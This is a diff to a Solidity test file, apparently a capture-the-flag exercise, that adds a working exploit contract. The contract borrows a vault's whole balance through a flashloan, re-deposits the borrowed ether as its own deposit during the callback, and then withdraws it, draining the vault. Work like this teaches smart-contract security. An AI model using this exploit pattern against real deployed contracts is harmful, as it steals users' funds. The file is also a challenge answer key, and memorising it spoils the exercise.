@@ -23,7 +23,9 @@ contract CallerTest is Test {
 
         // START OF SOLUTION
         // (You can create any additional contract if needed)
-
+        attack attackerContract = new attack{value:1 ether}(address(vault));
+        attackerContract.makeAttack();
+        attackerContract.withdraw();
         
 
         // END OF SOLUTION
@@ -34,4 +36,32 @@ contract CallerTest is Test {
         uint256 attackerBalance = address(attacker).balance;
         assertEq(attackerBalance, 11 ether, "Attacker didn't get the assets");
     }
+}
+
+contract attack {
+
+    Vault victim;
+
+    bool attacked;
+    constructor(address _vault) payable{
+        victim = Vault(_vault);
+    }
+
+    function makeAttack() public {
+        victim.flashloan(address(victim).balance);
+    }
+
+    receive() external payable {
+        if (!attacked) {
+            attacked = true;
+            victim.deposit{value: msg.value}();
+        }
+        
+    }
+
+    function withdraw() public {
+        victim.withdraw();
+        msg.sender.call{value: address(this).balance}("");
+    }
+
 }
